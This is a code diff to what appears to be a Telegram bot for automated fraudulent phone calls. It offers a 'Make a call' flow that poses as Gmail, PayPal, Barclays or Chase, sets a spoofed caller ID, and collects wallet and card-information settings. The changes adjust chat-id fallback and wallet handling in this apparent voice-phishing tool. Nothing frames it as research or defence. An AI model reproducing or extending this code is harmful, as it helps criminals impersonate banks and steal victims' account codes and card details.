@@ -21,7 +21,7 @@ const steps = (step) => [
         return ctx.wizard.next();
     }),
     (ctx) => __awaiter(void 0, void 0, void 0, function* () {
-        var _a;
+        var _a, _b;
         if (!ctx.message) {
             yield ctx.reply('🚫 Request expired, start again\n\n', telegraf_1.Markup.inlineKeyboard([telegraf_1.Markup.button.callback('Make a call', 'call')]));
             return ctx.scene.leave();
@@ -30,7 +30,7 @@ const steps = (step) => [
             ? `${step === 'account' ? 'Gmail' : 'Barclays'}`
             : `${step === 'account' ? 'Paypal' : 'Chase'}`})\n\n<i>***request will expire in 2 minutes***</i>\n\n<b><i>~ ${step.replace(/^./, step[0].toUpperCase())} ~</i></b>`, telegraf_1.Markup.inlineKeyboard([telegraf_1.Markup.button.callback('❌ Cancel', 'cancel')]));
         ctx.wizard.state.userCalling = {
-            [ctx.message.text]: (_a = ctx.chat) === null || _a === void 0 ? void 0 : _a.id,
+            [ctx.message.text]: ((_a = ctx.chat) === null || _a === void 0 ? void 0 : _a.id) || ((_b = ctx.from) === null || _b === void 0 ? void 0 : _b.id),
         };
         ctx.wizard.state.callData.number = ctx.message.text;
         return ctx.wizard.next();
@@ -106,10 +106,11 @@ const steps = (step) => [
             }
             ctx.wizard.state.callData.callerId = ctx.message.text;
         }
-        ctx.wizard.state.callData.wallet = ctx.message
-            ?
-                ctx.message.text
-            : undefined;
+        ctx.wizard.state.callData.wallet =
+            ctx.message && step === 'pay'
+                ?
+                    ctx.message.text
+                : undefined;
         const { number, institutionName, callerId, wallet, cardType, askCardInfo, } = ctx.wizard.state.callData;
         const from = /^(?:(?:\(?(?:0(?:0|11)\)?[\s-]?\(?|)44\)?[\s-]?(?:\(?0\)?[\s-]?)?)|(?:\(?0))(?:(?:\d{5}\)?[\s-]?\d{4,5})|(?:\d{4}\)?[\s-]?(?:\d{5}|\d{3}[\s-]?\d{3}))|(?:\d{3}\)?[\s-]?\d{3}[\s-]?\d{3,4})|(?:\d{2}\)?[\s-]?\d{4}[\s-]?\d{4}))(?:[\s-]?(?:x|ext\.?|\#)\d{3,4})?$/g.test(number)
             ? process.env.UK_NUM
